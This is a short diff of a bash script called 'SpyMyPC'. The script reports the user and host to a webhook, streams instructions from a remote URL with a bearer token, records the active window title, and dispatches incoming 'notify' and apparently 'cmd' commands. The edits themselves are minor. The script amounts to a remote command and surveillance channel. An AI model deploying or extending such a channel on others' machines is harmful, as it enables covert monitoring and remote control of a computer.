@@ -23,14 +23,14 @@ else
     exit 1
 fi
 
-sendWebhook "Started" "SpyMyPC is running at $USER@$HOSTNAME"
+sendWebhook "Started" "SpyMyPC is running at $USER@$HOSTNAME on $(uname)"
 coproc spymypc { curl -NsS -H "Authorization: Bearer $TOKEN" "$URL/raw"; }
 EMPLOYMENTPID=$spymypc_PID
 while [ true ]; do
     CURRENTWIN="$(kdotool getactivewindow getwindowname)"
     if read -r -t 0.1 output <&"${spymypc[0]}"; then
         if [[ "$output" == "stop" || "$output" == "exit" ]]; then
-            exit
+            exit 123
         elif [[ "$output" == "notify "* ]]; then
             notify-send "${output#"notify "}"
         elif [[ "$output" == "cmd "* ]]; then
